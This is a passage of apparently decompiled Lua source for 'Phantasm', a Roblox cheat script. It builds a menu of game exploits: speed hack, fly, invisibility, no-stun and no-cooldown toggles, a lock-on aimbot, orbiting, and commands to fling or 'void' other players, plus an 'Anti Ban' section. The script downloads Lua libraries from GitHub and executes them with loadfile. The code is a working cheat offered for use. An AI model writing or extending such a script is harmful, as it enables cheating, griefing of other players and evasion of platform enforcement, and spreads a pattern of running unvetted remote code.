                        v421.Name = string.sub(v421.Name, 14, #v421.Name);
                        local l_FirstChild_4 = l_Workspace_0.Live:FindFirstChild(v421.Name);
                        if l_FirstChild_4 then
                            l_FirstChild_4 = l_FirstChild_4.PrimaryPart;
                            if l_FirstChild_4 then
                                v421:SetPrimaryPartCFrame(l_FirstChild_4.CFrame * CFrame.new(-2.28881836E-4, 0, -3.15380859, 4.10526991E-4, -0.815318942, -0.579013944, -2.42984068E-8, 0.579013169, -0.815318465, 1.00000155, 3.32802534E-4, 2.36406922E-4));
                                return;
                            end;
                        end;
                    elseif v421.Name:find("AdjustStabby4") then
                        v421.Name = string.sub(v421.Name, 14, #v421.Name);
                        local l_FirstChild_5 = l_Workspace_0.Live:FindFirstChild(v421.Name);
                        if l_FirstChild_5 then
                            l_FirstChild_5 = l_FirstChild_5.PrimaryPart;
                            if l_FirstChild_5 then
                                v421:SetPrimaryPartCFrame((l_FirstChild_5.CFrame + Vector3.new(0, 0, 0, 0)) * CFrame.new(3.63522339, 1.28546143, -4.29478073, 4.26799059E-4, -0.920516968, 0.390702456, -1.22053878E-9, -0.390702516, -0.920517206, 0.99999994, 3.92824411E-4, -1.668185E-4));
                                return;
                            end;
                        end;
                    elseif v421.Name == "CleaveBruh" then
                        local l_FirstChild_6 = l_Workspace_0.Live:FindFirstChild(v421:GetAttribute("Name"));
                        if l_FirstChild_6 then
                            l_FirstChild_6 = l_FirstChild_6.PrimaryPart;
                            if l_FirstChild_6 and v421.PrimaryPart then
                                v421:SetPrimaryPartCFrame(l_FirstChild_6.CFrame * CFrame.Angles(math.rad((math.random(-360, 360))), math.rad((math.random(-360, 360))), (math.rad((math.random(-360, 360))))));
                            end;
                        end;
                    end;
                    return;
                end;
            end);
            l_Workspace_0.FallenPartsDestroyHeight = 0 / 0;
            local v434 = #v68 + 1;
            local v435 = "GetPropertyChangedSignal";
            local l_l_Workspace_0_0 = l_Workspace_0;
            v68[v434] = l_Workspace_0[v435](l_l_Workspace_0_0, "FallenPartsDestroyHeight"):Connect(function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: l_Workspace_0 (ref)
                l_Workspace_0.FallenPartsDestroyHeight = 0 / 0;
            end);
            v434 = "https://raw.githubusercontent.com/secretisadev/Obsidian/refs/heads/main/";
            if not isfolder("Obsidian") then
                v20.Text = "Creating 'Obsidian'";
                makefolder("Obsidian");
            end;
            if not isfile("Obsidian/Library.lua") then
                v20.Text = "Downloading 'Library.lua'";
                writefile("Obsidian/Library.lua", game:HttpGet(v434 .. "Library.lua"));
            end;
            if not isfile("Obsidian/ThemeManager.lua") then
                v20.Text = "Downloading 'ThemeManager.lua'";
                writefile("Obsidian/ThemeManager.lua", game:HttpGet(v434 .. "addons/ThemeManager.lua"));
            end;
            if not isfile("Obsidian/SaveManager.lua") then
                v20.Text = "Downloading 'SaveManager.lua'";
                writefile("Obsidian/SaveManager.lua", game:HttpGet(v434 .. "addons/SaveManager.lua"));
            end;
            v20.Text = "Loading UI";
            local v437 = loadfile("Obsidian/Library.lua")();
            l_l_Workspace_0_0 = loadfile("Obsidian/ThemeManager.lua")();
            v435 = loadfile("Obsidian/SaveManager.lua")();
            MoveNotify = function(v438, v439) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v437 (ref), v71 (ref), v98 (ref)
                if rawget(Options.MoveNotificationMoves.Value, v439) then
                    if Toggles.MoveNotifications.Value then
                        v437:Notify({
                            Title = bypassText("Move Notification"), 
                            Description = bypassText(v438.DisplayName .. " used " .. v439), 
                            Time = 5, 
                            SoundId = v71.Notification
                        });
                    end;
                    if Toggles.ExposeMoveInChat.Value and (not Toggles.ExposeWhitelistedPlayers.Value or not table.find(v98, v438)) then
                        sendMsg("\239\191\189\239\191\189\239\184\143 " .. v438.DisplayName .. " used " .. v439 .. " \226\154\160\239\184\143");
                    end;
                end;
            end;
            local v440 = "CreateWindow";
            local l_v437_0 = v437;
            local v442 = v437[v440](l_v437_0, {
                Title = bypassText("Phantasm"), 
                Footer = bypassText("Old test version, Do not expect updates. | discord.gg/phantasm"), 
                NotifySide = "Right", 
                ShowCustomCursor = true, 
                AutoShow = true, 
                Center = true, 
                Resizable = true
            });
            l_v437_0 = {
                Information = v442:AddTab(bypassText("Information"), "book"), 
                LocalPlayer = v442:AddTab(bypassText("Local Player"), "user"), 
                Exploits = v442:AddTab(bypassText("Exploits"), "skull"), 
                Visuals = v442:AddTab(bypassText("Visuals"), "eye"), 
                Commands = v442:AddTab("Commands", "code"), 
                Map = v442:AddTab(bypassText("Map"), "map"), 
                Disguise = v442:AddTab(bypassText("Disguise"), "users"), 
                Misc = v442:AddTab(bypassText("Miscallenous"), "ellipsis"), 
                ["UI Settings"] = v442:AddTab(bypassText("UI Settings"), "settings")
            };
            v440 = l_v437_0.Information:AddLeftGroupbox(bypassText("Update Log"));
            local v443 = l_v437_0.LocalPlayer:AddLeftTabbox();
            local v444 = v443:AddTab(bypassText("Movement"));
            local v445 = v443:AddTab(bypassText("Character"));
            local v446 = l_v437_0.LocalPlayer:AddLeftGroupbox(bypassText("Keybinds"));
            local v447 = l_v437_0.LocalPlayer:AddRightGroupbox(bypassText("Automation"));
            local v448 = l_v437_0.LocalPlayer:AddRightGroupbox(bypassText("Dashes"));
            local v449 = l_v437_0.Exploits:AddLeftGroupbox(bypassText("Main"));
            local v450 = l_v437_0.Exploits:AddRightGroupbox(bypassText("Wall Combo"));
            local v451 = l_v437_0.Exploits:AddLeftGroupbox(bypassText("Anti's"));
            local v452 = l_v437_0.Exploits:AddRightGroupbox(bypassText("Invisible Moves"));
            local v453 = l_v437_0.Visuals:AddLeftGroupbox(bypassText("Main"));
            local v454 = l_v437_0.Visuals:AddRightGroupbox(bypassText("ESP"));
            local v455 = l_v437_0.Visuals:AddRightGroupbox(bypassText("World"));
            local v456 = l_v437_0.Commands:AddLeftGroupbox("Settings");
            local v457 = l_v437_0.Commands:AddRightGroupbox("Commands");
            local v458 = l_v437_0.Map:AddLeftGroupbox(bypassText("Teleports"));
            local v459 = l_v437_0.Map:AddRightGroupbox(bypassText("Players"));
            local v460 = l_v437_0.Misc:AddLeftGroupbox(bypassText("Anti Ban"));
            local v461 = l_v437_0.Misc:AddLeftGroupbox(bypassText("Scripts"));
            local v462 = l_v437_0.Misc:AddRightGroupbox(bypassText("Animations"));
            local v463 = l_v437_0.Misc:AddRightGroupbox(bypassText("Extra"));
            local v464 = l_v437_0["UI Settings"]:AddLeftGroupbox(bypassText("Settings"));
            Options = v437.Options;
            Toggles = v437.Toggles;
            Labels = v437.Labels;
            task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v440 (ref)
                local v465 = game:HttpGet("https://raw.githubusercontent.com/secretisadev/Phantasm/refs/heads/main/Update Log");
                if v465 then
                    local v466 = v465:split("\n");
                    local v467 = "";
                    for v468, v469 in pairs(v466) do
                        if v469:sub(1, 2) == "+ " then
                            v467 = v467 .. formatRichText(200, 255, 100, v469);
                        elseif v469:sub(1, 2) == "- " then
                            v467 = v467 .. formatRichText(255, 65, 65, v469);
                        else
                            v467 = v467 .. v469;
                        end;
                        if v468 ~= #v467 then
                            v467 = v467 .. "\n";
                        end;
                    end;
                    v440:AddLabel({
                        Text = v467, 
                        DoesWrap = true, 
                        Size = 12
                    });
                end;
            end);
            v456:AddToggle("CommandBar", {
                Text = "Command Bar", 
                Default = false
            }):AddKeyPicker("CommandBind", {
                SyncToggleState = false, 
                Mode = "Toggle", 
                Default = "Semicolon", 
                Text = "Command Bar Keybind", 
                NoUI = true
            });
            v456:AddToggle("UseCommandsinChat", {
                Text = "Use Commands in Chat", 
                Default = false
            });
            v456:AddToggle("SendCommandInChat", {
                Text = "Send Command In Chat", 
                Default = false
            });
            v456:AddDivider();
            v456:AddDropdown("FlingType", {
                Values = {
                    "Anti-Fling", 
                    "Normal", 
                    "Void"
                }, 
                Default = "Void", 
                Text = "Fling Type"
            });
            v456:AddSlider("FlingSpeed", {
                Text = "Fling Speed", 
                Default = 15, 
                Min = 15, 
                Max = 90, 
                Rounding = 0, 
                Compact = true
            });
            v456:AddSlider("FlingTimeout", {
                Text = "Fling Timeout", 
                Default = 3, 
                Min = 1, 
                Max = 5, 
                Rounding = 0, 
                Compact = true
            });
            v457:AddLabel(";safezone\r\n;goto/tp/to {player}\r\n;say {message}\r\n;fling/void {player, all, others}\r\n;loopfling/loopvoid {player, all, others}\r\n;unfling/unvoid/unloopfling/unloopvoid {player, all, others}\r\n;view/spectate {player}\r\n;unview/unspectate\r\n;whitelist/addwhitelist\r\n;unwhitelist/removewhitelist\r\n;rejoin/rj\r\n;reset\r\n;fixcam\r\n;vclip {number}\r\n;hclip {number}", true);
            v444:AddToggle("SpeedHackEnabled", {
                Text = bypassText("Speed Hack Enabled"), 
                Default = false
            });
            v444:AddSlider("SpeedHack", {
                Text = bypassText("Speed"), 
                Default = 1, 
                Min = 1, 
                Max = 25000, 
                Rounding = 1, 
                Compact = true
            });
            v444:AddDropdown("SpeedHackMethod", {
                Values = {
                    "CFrame", 
                    "Velocity"
                }, 
                Default = 1, 
                Multi = false, 
                Text = bypassText("Speed Hack Method")
            });
            v444:AddToggle("UpsideDown", {
                Text = bypassText("Upside Down"), 
                Default = false, 
                Callback = function(v470) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: l_Heartbeat_0 (ref), v94 (ref)
                    l_Heartbeat_0:Wait();
                    v94["Upside Down"] = v470;
                end
            });
            v445:AddToggle("Invisibility", {
                Text = bypassText("Invisibility"), 
                Default = false, 
                Callback = function(v471) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: l_Heartbeat_0 (ref), v94 (ref)
                    l_Heartbeat_0:Wait();
                    v94.Invisibility = v471;
                end
            });
            v445:AddToggle("M1Reset", {
                Text = bypassText("M1 Reset / No Dash Debounce"), 
                Default = false
            });
            v445:AddToggle("EmoteDash", {
                Text = bypassText("Emote Dash"), 
                Default = false
            });
            v445:AddDropdown("CharacterExploits", {
                Values = {
                    "No Dash Cooldown", 
                    "No Stun", 
                    "No Slow", 
                    "No Fatigue", 
                    "No Jump Bypass", 
                    "No Rotations Bypass", 
                    "Anti Ragdoll"
                }, 
                Default = {}, 
                Multi = true, 
                Searchable = false, 
                Text = bypassText("Character Exploits"), 
                Callback = function(v472) --[[ Line: 0 ]] --[[ Name:  ]]
                    workspace:SetAttribute("NoDashCooldown", false);
                    workspace:SetAttribute("NoFatigue", false);
                    if rawget(v472, "No Dash Cooldown") then
                        workspace:SetAttribute("NoDashCooldown", true);
                    elseif rawget(v472, "No Fatigue") then
                        workspace:SetAttribute("NoFatigue", true);
                    elseif rawget(v472, "No Rotations Bypass") then
                        deleteAllInstances(nil, "NoRotate");
                    end;
                end
            });
            v445:AddToggle("AutoRagdollCancel", {
                Text = bypassText("Auto Ragdoll Cancel"), 
                Default = false
            });
            v445:AddToggle("RagdollHide", {
                Text = bypassText("Ragdoll Hide"), 
                Default = false
            });
            v445:AddToggle("LaunchHide", {
                Text = bypassText("Launch Hide"), 
                Default = false
            });
            workspace:SetAttribute("EffectAffects", 1);
            v68[#v68 + 1] = workspace.AttributeChanged:Connect(function(v473) --[[ Line: 0 ]] --[[ Name:  ]]
                if v473 == "NoDashCooldown" then
                    workspace:SetAttribute(v473, rawget(Options.CharacterExploits.Value, "No Dash Cooldown") and true or false);
                elseif v473 == "NoFatigue" then
                    workspace:SetAttribute(v473, rawget(Options.CharacterExploits.Value, "No Fatigue") and true or false);
                elseif v473 == "EffectsAffect" then
                    workspace:SetAttribute("EffectAffects", 1);
                end;
            end);
            v447:AddToggle("AutoFrozenSoul", {
                Text = bypassText("Auto Frozen Soul"), 
                Default = false, 
                Callback = function(v474) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: l_Stepped_0 (ref), l_RenderStepped_0 (ref), l_l_UserInputService_0_0 (ref)
                    if v474 then
                        local function v478(v475) --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: l_Stepped_0 (ref), l_RenderStepped_0 (ref)
                            l_Stepped_0:Wait();
                            if v475.Name == "Frozen Lock" and v475:FindFirstChild("Root") then
                                local l_Root_0 = v475.Root;
                                local v477 = tick();
                                repeat
                                    heartbeatTp(l_Root_0.CFrame * CFrame.new(0, 3, 0));
                                    l_RenderStepped_0:Wait();
                                until tick() >= v477 + 10 or not v475.Parent or not Toggles.AutoFrozenSoul.Value;
                            end;
                        end;
                        if l_l_UserInputService_0_0:FindFirstChild("Frozen Lock") then
                            task.spawn(v478, l_l_UserInputService_0_0["Frozen Lock"]);
                        end;
                        local v479 = l_l_UserInputService_0_0.ChildAdded:Connect(v478);
                        repeat
                            l_RenderStepped_0:Wait();
                        until not Toggles.AutoFrozenSoul.Value;
                        v479:Disconnect();
                    end;
                end
            });
            v447:AddButton({
                Text = bypassText("Free Stargazer / Nightchild"), 
                Callback = function() --[[ Line: 0 ]] --[[ Name:  ]]
                    communicate({
                        Goal = "Gaze"
                    });
                end
            });
            v448:AddToggle("CustomFrontDash", {
                Text = bypassText("Custom Front Dash"), 
                Tooltip = bypassText("Makes your front dashes go slightly further."), 
                Default = false
            });
            v448:AddSlider("FDDistance", {
                Text = bypassText("Front Dash Distance"), 
                Default = 165, 
                Min = 0, 
                Max = 500, 
                Rounding = 1
            });
            v448:AddToggle("CustomSideDash", {
                Text = bypassText("Custom Side Dash"), 
                Tooltip = bypassText("Makes your side dashes go slightly further."), 
                Default = false
            });
            v448:AddSlider("SDDistance", {
                Text = bypassText("Side Dash Distance (Multiplier)"), 
                Default = 1, 
                Min = 0.1, 
                Max = 2, 
                Rounding = 1
            });
            v448:AddSlider("SDSpeed", {
                Text = bypassText("Side Dash Speed"), 
                Default = 1, 
                Min = 0.1, 
                Max = 2, 
                Rounding = 1
            });
            v448:AddToggle("CustomBackDash", {
                Text = bypassText("Custom Back Dash"), 
                Tooltip = bypassText("Makes your back dashes go slightly further."), 
                Default = false
            });
            v448:AddSlider("BDDistance", {
                Text = bypassText("Back Dash Distance (Multiplier)"), 
                Default = 1, 
                Min = 0.1, 
                Max = 2, 
                Rounding = 1
            });
            v448:AddButton({
                Text = bypassText("Reset to Defaults"), 
                Callback = function() --[[ Line: 0 ]] --[[ Name:  ]]
                    Options.FDDistance:SetValue(165);
                    Options.SDDistance:SetValue(1);
                    Options.SDSpeed:SetValue(1);
                    Options.BDDistance:SetValue(1);
                end
            });
            local v480 = {
                Fly = false, 
                ["Lock-on"] = false, 
                Orbit = false, 
                ["Velocity Spoof"] = false, 
                ["TP 1"] = false, 
                ["TP 2"] = false
            };
            v446:AddToggle("Fly", {
                Text = bypassText("Fly"), 
                Default = false, 
                Callback = function(v481) --[[ Line: 0 ]] --[[ Name:  ]]
                    if not v481 and Options.FlyBind:GetState() == true then
                        Options.FlyBind.Toggled = false;
                        Options.FlyBind:DoClick();
                    end;
                end
            }):AddKeyPicker("FlyBind", {
                SyncToggleState = false, 
                Mode = "Toggle", 
                Default = "Y", 
                Text = bypassText("Fly"), 
                Callback = function(v482) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v480 (ref), l_RenderStepped_0 (ref), v94 (ref), v437 (ref), v71 (ref), v12 (ref), l_Heartbeat_0 (ref)
                    local v483 = false;
                    if v480.Fly then
                        return;
                    elseif v482 and not Toggles.Fly.Value then
                        l_RenderStepped_0:Wait();
                        v480.Fly = true;
                        Options.FlyBind.Toggled = false;
                        Options.FlyBind:DoClick();
                        v480.Fly = false;
                        return;
                    else
                        if Toggles.Fly.Value then
                            v94.Flying = not v94.Flying;
                            v437:Notify({
                                Title = bypassText("Fly"), 
                                Description = bypassText("Toggled ") .. (v482 and "on \226\156\133" or "off \226\157\140"), 
                                Time = 2, 
                                SoundId = v71.Notification
                            });
                            if v94.Flying then
                                local v484 = nil;
                                local v485 = getChar(v12);
                                local v486 = v485 and getHumanoid(v485);
                                local v487 = v485 and getRoot(v485);
                                if v485 and v487 and v486 then
                                    v484 = v487.CFrame;
                                end;
                                if true then
                                    local l_v484_0 = v484;
                                    local v504 = l_Heartbeat_0:Connect(function(v489) --[[ Line: 0 ]] --[[ Name:  ]]
                                        -- upvalues: v12 (ref), l_v484_0 (ref)
                                        local v490 = getChar(v12);
                                        local v491 = v490 and getHumanoid(v490);
                                        local v492 = v490 and getRoot(v490);
                                        local l_CurrentCamera_0 = workspace.CurrentCamera;
                                        if v490 and v492 and v491 and l_CurrentCamera_0 then
                                            local v494 = Options.FlySpeed.Value / 100;
                                            local v495 = Vector3.new(0, 0, 0);
                                            local v496 = CFrame.new(0, 0, 0);
                                            local l_CFrame_1 = l_CurrentCamera_0.CFrame;
                                            local l_LookVector_0 = l_CFrame_1.LookVector;
                                            local l_RightVector_0 = l_CFrame_1.RightVector;
                                            local v500 = CFrame.new(v492.Position, v492.Position + Vector3.new(l_LookVector_0.X, 0, l_LookVector_0.Z));
                                            local v501 = math.round((v491.MoveDirection:Dot(v500.LookVector)));
                                            local v502 = math.round((v491.MoveDirection:Dot(v500.RightVector)));
                                            if v501 == 1 then
                                                v495 = v495 + l_LookVector_0 * v494;
                                                v496 = v492.CFrame + l_LookVector_0 * (v489 * v494);
                                            end;
                                            if v501 == -1 then
                                                v495 = v495 + l_LookVector_0 * -v494;
                                                v496 = v492.CFrame + -l_LookVector_0 * (v489 * v494);
                                            end;
                                            if v502 == -1 then
                                                v495 = v495 + l_RightVector_0 * -v494;
                                                v496 = v492.CFrame + -l_RightVector_0 * (v489 * v494);
                                            end;
                                            if v502 == 1 then
                                                v495 = v495 + l_RightVector_0 * v494;
                                                v496 = v492.CFrame + l_RightVector_0 * (v489 * v494);
                                            end;
                                            if v501 ~= 0 or v502 ~= 0 then
                                                v492.Velocity = v495;
                                                l_v484_0 = v492.CFrame;
                                            else
                                                v492.Velocity = Vector3.new();
                                                v492.CFrame = l_v484_0 or v492.CFrame;
                                            end;
                                            v492.RotVelocity = Vector3.new();
                                            local l_Value_0 = Options.FlyRotations.Value;
                                            if l_Value_0 == "Horizontal" then
                                                v492.CFrame = CFrame.new(v492.Position, v492.Position + Vector3.new(l_LookVector_0.X, 0, l_LookVector_0.Z));
                                            elseif l_Value_0 == "Vertical & Horizontal" then
                                                v492.CFrame = CFrame.new(v492.CFrame.Position, v492.CFrame.Position + l_CFrame_1.LookVector);
                                            end;
                                        end;
                                    end);
                                    repeat
                                        task.wait();
                                    until not v94.Flying or not Toggles.Fly.Value;
                                    v94.Flying = false;
                                    v504:Disconnect();
                                    local v505 = getChar(v12);
                                    local v506 = v505 and getRoot(v505);
                                    local v507 = v505 and getHumanoid(v505);
                                    if v505 and v506 and v507 and not v507.SeatPart then
                                        local v508 = tick();
                                        v506.Velocity = Vector3.new();
                                        v483 = v506.Velocity.Magnitude <= 5 or tick() >= v508 + 1;
                                    end;
                                    if not v483 then
                                        if v507 and v507.SeatPart then
                                            local v509 = tick();
                                            repeat
                                                if v507.SeatPart then
                                                    v507.SeatPart.Velocity = Vector3.new();
                                                end;
                                            until v507.SeatPart and v507.SeatPart.Velocity.Magnitude <= 5 or not v507.SeatPart or tick() >= v509 + 1;
                                        end;
                                    end;
                                    v483 = false;
                                end;
                            end;
                        end;
                        return;
                    end;
                end
            });
            v446:AddSlider("FlySpeed", {
                Text = bypassText("Fly Speed"), 
                Default = 10000, 
                Min = 1, 
                Max = 50000, 
                Rounding = 1
            });
            v446:AddDropdown("FlyRotations", {
                Values = {
                    "None", 
                    "Horizontal", 
                    "Vertical & Horizontal"
                }, 
                Default = {}, 
                Multi = false, 
                Searchable = false, 
                Text = bypassText("Fly Rotations")
            });
            v446:AddDivider();
            v446:AddToggle("AnimeTeleportation", {
                Text = bypassText("Anime Teleportation"), 
                Default = false, 
                Callback = function(v510) --[[ Line: 0 ]] --[[ Name:  ]]
                    if not v510 and Options.AnimeTPKeybind:GetState() == true then
                        Options.AnimeTPKeybind.Toggled = false;
                        Options.AnimeTPKeybind:DoClick();
                    end;
                end
            }):AddKeyPicker("AnimeTPKeybind", {
                SyncToggleState = false, 
                Mode = "Toggle", 
                Default = "T", 
                Text = bypassText("Anime Teleportation"), 
                Callback = function(_) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: l_v12_Mouse_0 (ref), v12 (ref), l_ReplicatedStorage_0 (ref), l_Debris_0 (ref), v94 (ref)
                    Options.AnimeTPKeybind.Toggled = false;
                    if Toggles.AnimeTeleportation.Value and l_v12_Mouse_0.Target then
                        local v512 = getChar(v12);
                        local v513 = v512 and getRoot(v512);
                        local v514 = v512 and getHumanoid(v512);
                        do
                            local l_v512_0 = v512;
                            if l_v512_0 and v513 and v514 then
                                stopAllAnims(v514, {
                                    "15957361339"
                                });
                                if Toggles.AnimeTPAnimation.Value then
                                    local v516 = loadAnim(v514, "15957361339");
                                    v516.Priority = Enum.AnimationPriority.Action2;
                                    v516:Play();
                                    v516:AdjustSpeed(Options.AnimeTPSpeed.Value);
                                end;
                                local l_CFrame_2 = v513.CFrame;
                                heartbeatTp(CFrame.new(l_v12_Mouse_0.Hit.Position, Vector3.new(l_CFrame_2.Position.X, l_v12_Mouse_0.Hit.Position.Y, l_CFrame_2.Position.Z)) * CFrame.Angles(0, math.pi, 0));
                                local l_Value_1 = Options.AnimeTPSound.Value;
                                if l_Value_1 == "Goku" then
                                    local v519 = loadSound(v513, "4861638982");
                                    v519.Volume = Options.AnimeTPVolume.Value;
                                    v519:Play();
                                elseif l_Value_1 == "Goku Black" then
                                    local v520 = loadSound(v513, "9010221848");
                                    v520.Volume = Options.AnimeTPVolume.Value;
                                    v520:Play();
                                    v520.TimePosition = 0.4;
                                end;
                                local v521 = l_ReplicatedStorage_0.Resources.KJEffects.tpthing:Clone();
                                v521.Parent = v513;
                                v521:Emit(15);
                                l_Debris_0:AddItem(v521, 1);
                                for _, v523 in pairs(l_v512_0:GetDescendants()) do
                                    do
                                        local l_v523_0 = v523;
                                        if l_v523_0:IsA("BasePart") and l_v523_0 ~= v513 and l_v523_0.Transparency ~= 1 and not l_v523_0.Name:lower():find("hitbox") then
                                            task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: l_v523_0 (ref), v94 (ref), l_v512_0 (ref)
                                                l_v523_0.Transparency = 1;
                                                task.delay(0.1, function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v94 (ref), l_v512_0 (ref), l_v523_0 (ref)
                                                    if v94.Invisibility or getgenv().desync and not l_v512_0:FindFirstChild("AbsoluteImmortal") then
                                                        l_v523_0.Transparency = 0.5;
                                                    else
                                                        l_v523_0.Transparency = 0;
                                                    end;
                                                end);
                                                local l_Decal_0 = l_v523_0:FindFirstChildWhichIsA("Decal");
                                                if l_Decal_0 and l_Decal_0.Transparency ~= 1 then
                                                    local l_Transparency_0 = l_Decal_0.Transparency;
                                                    l_Decal_0.Transparency = 1;
                                                    task.wait(0.1);
                                                    l_Decal_0.Transparency = l_Transparency_0;
                                                end;
                                            end);
                                        end;
                                    end;
                                end;
                            end;
                        end;
                    end;
                end
            });
            v446:AddToggle("AnimeTPAnimation", {
                Text = bypassText("Teleport Animation"), 
                Default = false
            });
            v446:AddDropdown("AnimeTPSound", {
                Values = {
                    "None", 
                    "Goku", 
                    "Goku Black"
                }, 
                Default = 1, 
                Multi = false, 
                Text = bypassText("Teleport Sound")
            });
            v446:AddSlider("AnimeTPVolume", {
                Text = bypassText("Sound Volume"), 
                Default = 10, 
                Min = 1, 
                Max = 10, 
                Rounding = 1
            });
            v446:AddSlider("AnimeTPSpeed", {
                Text = bypassText("Animation Speed"), 
                Default = 1, 
                Min = 0.5, 
                Max = 5, 
                Rounding = 1
            });
            v446:AddDivider();
            v446:AddToggle("Lock-on", {
                Text = bypassText("Lock-on"), 
                Default = false, 
                Callback = function(v527) --[[ Line: 0 ]] --[[ Name:  ]]
                    if not v527 and Options["L-OnKeybind"]:GetState() == true then
                        Options["L-OnKeybind"].Toggled = false;
                        Options["L-OnKeybind"]:DoClick();
                    end;
                end
            }):AddKeyPicker("L-OnKeybind", {
                SyncToggleState = false, 
                Mode = "Toggle", 
                Default = "V", 
                Text = bypassText("Lock-on"), 
                Callback = function(v528) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v480 (ref), l_RenderStepped_0 (ref), v12 (ref), l_Stats_0 (ref), v94 (ref)
                    if v480["Lock-on"] then
                        return;
                    elseif v528 and not Toggles["Lock-on"].Value then
                        l_RenderStepped_0:Wait();
                        v480["Lock-on"] = true;
                        Options["L-OnKeybind"].Toggled = false;
                        Options["L-OnKeybind"]:DoClick();
                        v480["Lock-on"] = false;
                        return;
                    else
                        local v529 = closestPlayerV2(true);
                        if v529 and v528 and Toggles["Lock-on"].Value then
                            repeat
                                local v530 = getChar(v12);
                                local v531 = v530 and getRoot(v530);
                                local v532 = v530 and getHumanoid(v530);
                                local v533 = v529 and getChar(v529);
                                local v534 = v533 and getRoot(v533);
                                local v535 = v533 and getHumanoid(v533);
                                if v530 and v531 and v532 and v529 and v533 and v534 and v535 and v532.Health > 0 then
                                    v532.AutoRotate = false;
                                    local v536 = v533:FindFirstChildWhichIsA("Highlight") or Instance.new("Highlight", v533);
                                    v536.FillTransparency = 0.8;
                                    v536.OutlineTransparency = 0;
                                    v536.DepthMode = "AlwaysOnTop";
                                    v536.FillColor = Color3.fromRGB(255, 0, 0);
                                    v536.OutlineColor = Color3.fromRGB(255, 0, 0);
                                    local l_Position_0 = v531.Position;
                                    local l_Position_1 = v534.Position;
                                    local _ = v534.Velocity;
                                    local v540 = Toggles["Auto_Lock-on_Prediction"].Value and l_Stats_0.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000 or Options["Lock-on_Prediction"].Value;
                                    local v541 = Vector3.new(l_Position_1.X, v94.Flying and l_Position_1.Y or l_Position_0.Y, l_Position_1.Z) + v535.MoveDirection * v534.Velocity.Magnitude * 0.1;
                                    if Toggles["Auto_Lock-on_Prediction"].Value then
                                        Options["Lock-on_Prediction"]:SetValue(tonumber(string.format("%.1f", v540)));
                                    end;
                                    if not v530:FindFirstChild("Ragdoll") then
                                        v531.CFrame = CFrame.new(l_Position_0, v541);
                                    end;
                                end;
                                l_RenderStepped_0:Wait();
                            until Options["L-OnKeybind"]:GetState() == false or v529 and not v529.Parent or not v529;
                            local v542 = getChar(v12);
                            local v543 = v542 and getRoot(v542);
                            local v544 = v542 and getHumanoid(v542);
                            if v542 and v543 and v544 then
                                v544.AutoRotate = true;
                            end;
                            local v545 = v529 and getChar(v529);
                            local v546 = v545 and v545:FindFirstChildWhichIsA("Highlight");
                            if v529 and v545 and v546 then
                                if getHighestStreak() == v529 and (v545:GetAttribute("CurrentStreak") or 0) >= 10 and not v529:GetAttribute("S_HideStreak") then
                                    v546.FillTransparency = 1;
                                    v546.OutlineTransparency = 0;
                                    v546.DepthMode = "Occluded";
                                    v546.FillColor = Color3.fromRGB(255, 255, 0);
                                    v546.OutlineColor = Color3.fromRGB(255, 255, 0);
                                else
                                    v546.FillTransparency = 1;
                                    v546.OutlineTransparency = 1;
                                    v546.DepthMode = "Occluded";
                                    v546.FillColor = Color3.fromRGB(255, 255, 255);
                                    v546.OutlineColor = Color3.fromRGB(255, 255, 255);
                                end;
                            end;
                        end;
                        return;
                    end;
                end
            });
            v446:AddSlider("Lock-on_Prediction", {
                Text = bypassText("Prediction"), 
                Default = 0.1, 
                Min = 0.1, 
                Max = 1, 
                Rounding = 1, 
                Compact = true
            });
            v446:AddToggle("Auto_Lock-on_Prediction", {
                Text = bypassText("Auto Prediction"), 
                Default = false
            });
            v446:AddDivider();
            v446:AddToggle("Orbit", {
                Text = bypassText("Orbit"), 
                Default = false, 
                Callback = function(v547) --[[ Line: 0 ]] --[[ Name:  ]]
                    if not v547 and Options.OrbitBind:GetState() == true then
                        Options.OrbitBind.Toggled = false;
                        Options.OrbitBind:DoClick();
                    end;
                end
            }):AddKeyPicker("OrbitBind", {
                SyncToggleState = false, 
                Mode = "Toggle", 
                Default = "H", 
                Text = bypassText("Orbit"), 
                Callback = function(v548) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v480 (ref), l_RenderStepped_0 (ref), v12 (ref), v437 (ref), v71 (ref), l_Workspace_0 (ref), v94 (ref)
                    if v480.Orbit then
                        return;
                    elseif v548 and not Toggles.Orbit.Value then
                        l_RenderStepped_0:Wait();
                        v480.Orbit = true;
                        Options.OrbitBind.Toggled = false;
                        Options.OrbitBind:DoClick();
                        v480.Orbit = false;
                        return;
                    else
                        local v549 = closestPlayerV2(true);
                        if v549 and v548 and Toggles.Orbit.Value then
                            local _ = 0;
                            local v551 = nil;
                            local v552 = getChar(v12);
                            local v553 = v552 and getRoot(v552);
                            local v554 = v552 and getHumanoid(v552);
                            if v552 and v553 and v554 then
                                v551 = v553.CFrame;
                            end;
                            v437:Notify({
                                Title = bypassText("Orbit"), 
                                Description = bypassText("Toggled on ") .. "\239\191\189\239\191\189", 
                                Time = 2, 
                                SoundId = v71.Notification
                            });
                            local v555 = 0;
                            repeat
                                local v556 = getChar(v12);
                                local v557 = v556 and getRoot(v556);
                                local v558 = v556 and getHumanoid(v556);
                                local v559 = v549 and getChar(v549);
                                local v560 = v559 and getRoot(v559);
                                local v561 = v559 and getHumanoid(v559);
                                if v556 and v557 and v558 and v549 and v559 and v560 and v561 then
                                    local l_CurrentCamera_1 = l_Workspace_0.CurrentCamera;
                                    if l_CurrentCamera_1 and l_CurrentCamera_1.CameraSubject ~= v561 then
                                        l_CurrentCamera_1.CameraSubject = v561;
                                    end;
                                    local l_Value_2 = Options.OrbitSpeed.Value;
                                    local l_Value_3 = Options.OrbitDistance.Value;
                                    v555 = v555 + l_Value_2;
